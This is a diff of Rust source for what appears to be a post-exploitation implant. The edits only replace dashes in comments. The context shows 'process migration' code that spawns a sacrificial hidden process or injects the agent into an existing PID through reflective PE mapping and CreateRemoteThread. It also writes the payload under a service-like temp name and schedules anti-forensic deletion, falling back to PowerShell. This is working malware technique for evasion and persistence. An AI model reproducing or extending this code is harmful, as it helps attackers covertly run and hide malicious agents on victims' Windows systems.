@@ -3,8 +3,8 @@
 // Process migration: move the agent's runtime into another process.
 //
 // Two strategies:
-//   1. spawn_migrate  — spawn a sacrificial process, inject agent, exit self
-//   2. inject_migrate — inject into an existing PID
+//   1. spawn_migrate - spawn a sacrificial process, inject agent, exit self
+//   2. inject_migrate - inject into an existing PID
 //
 // Both read the current binary's config from the embedded blob, generate
 // a bootstrap that manually maps the PE into the target, and transfer
@@ -115,7 +115,7 @@ pub mod windows {
             {
                 if let Some(current_index) = Self::get_file_index(&self.path) {
                     if current_index != self.file_index && self.file_index != 0 {
-                        // File identity changed — possible symlink replacement. Don't overwrite.
+                        // File identity changed - possible symlink replacement. Don't overwrite.
                         let _ = fs::remove_file(&self.path);
                         return;
                     }
@@ -126,7 +126,7 @@ pub mod windows {
                 use std::os::unix::fs::MetadataExt;
                 if let Ok(meta) = fs::symlink_metadata(&self.path) {
                     if meta.file_type().is_symlink() {
-                        // Symlink detected — don't follow it
+                        // Symlink detected - don't follow it
                         let _ = fs::remove_file(&self.path);
                         return;
                     }
@@ -222,7 +222,7 @@ pub mod windows {
     /// NOTE: This touches disk. A stealthier approach would use process hollowing
     /// or reflective injection, but this is reliable across all PE types.
     pub unsafe fn spawn_migrate(binary_path: &str, pe_bytes: &[u8]) -> Result<String, String> {
-        let _ = binary_path; // unused — we spawn the PE directly, not a host process
+        let _ = binary_path; // unused - we spawn the PE directly, not a host process
         
         let temp_dir = std::env::temp_dir();
         let temp_name = random_temp_name("svc_", "exe");
@@ -230,7 +230,7 @@ pub mod windows {
         fs::write(&temp_path, pe_bytes).map_err(|e| format!("Write temp: {}", e))?;
 
         // RAII guard: securely overwrites and deletes the temp file on drop.
-        // Only effective if CreateProcessA FAILS — if it succeeds, the new
+        // Only effective if CreateProcessA FAILS - if it succeeds, the new
         // agent process locks the file and Windows prohibits write access.
         let mut guard = TempFileGuard::new(temp_path.clone());
 
@@ -245,7 +245,7 @@ pub mod windows {
             app.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
             0, CREATE_NO_WINDOW, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi,
         ) == 0 {
-            // guard drops here → securely deletes (file isn't locked)
+            // guard drops here -> securely deletes (file isn't locked)
             return Err(format!("CreateProcess failed: {}", GetLastError()));
         }
 
@@ -259,7 +259,7 @@ pub mod windows {
         CloseHandle(pi.h_process);
 
         // The new agent process is running indefinitely from the temp file.
-        // Windows locks running executables — TempFileGuard's wipe will fail.
+        // Windows locks running executables - TempFileGuard's wipe will fail.
         // Instead of silently leaving the payload on disk, schedule deletion
         // for the next reboot. The new agent's own self_destruct() will also
         // attempt cleanup when it eventually exits.
@@ -279,7 +279,7 @@ pub mod windows {
             let scheduled = MoveFileExW(wide_path.as_ptr(), std::ptr::null(), MOVEFILE_DELAY_UNTIL_REBOOT);
 
             if scheduled == 0 {
-                // MoveFileExW failed — likely running as unprivileged user (requires
+                // MoveFileExW failed - likely running as unprivileged user (requires
                 // admin to write PendingFileRenameOperations). Fall back to a deferred
                 // PowerShell delete. The file is locked now but the shell command will
                 // retry until the process exits or reboot.
@@ -325,7 +325,7 @@ pub mod windows {
     /// Inject into an existing process via remote PE mapping.
     ///
     /// Maps the agent PE directly into the target process's memory space
-    /// and executes it via CreateRemoteThread — no disk writes, no WinExec,
+    /// and executes it via CreateRemoteThread - no disk writes, no WinExec,
     /// no temp files. This is a standard reflective-injection technique.
     ///
     /// Steps:
